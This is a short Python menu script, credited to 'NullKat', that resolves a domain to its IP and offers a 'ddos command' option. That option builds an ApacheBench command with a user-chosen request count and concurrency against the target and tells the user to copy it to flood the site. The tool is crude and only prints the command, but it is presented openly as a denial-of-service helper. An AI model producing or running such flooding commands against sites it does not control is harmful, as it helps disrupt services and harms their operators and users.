import socket
import time

print("loading script")
print("please be patient")
time.sleep(5)
print("=== SCRIPT BY \033[91mNullKat\033[0m ===")
time.sleep(1)

while True:
      print("=== </> ===")
      print("1. find IP")
      print("2. credit to")
      print("3. ddos command")
      print("4. exit")
      print("=== </> ===")
      type = input(">")

      if type == "1":
          domain = input("domain name:")
          print("=== PROCESSING ===")
          time.sleep(2)
          ip = socket.gethostbyname(domain)
          print("=== IP ADDRESS ===")
          print(f"IP Address: {ip}")
          print("=== IP ADDRESS ===")
          time.sleep(3)

      if type == "2":
          print("=== CREDIT TO ===")
          print("1. Wahyu Katnoko")
          print("=== CREDIT TO ===")
          print("yes, i make this alone")
          time.sleep(2)

      if type == "3":
          domain = input("domain name:")
          request = input("request amount:")
          beban = input("amount: ")
          il = socket.gethostbyname(domain)

          print("=== DDOS COMMAND ===")
          print(f"ab -n {request} -c {beban} http://{il}/")
          print("=== DDOS COMMAND ===")
          print("please copy the command")
          time.sleep(3)

      if type == "4":
          print("thanks for using!")
          break
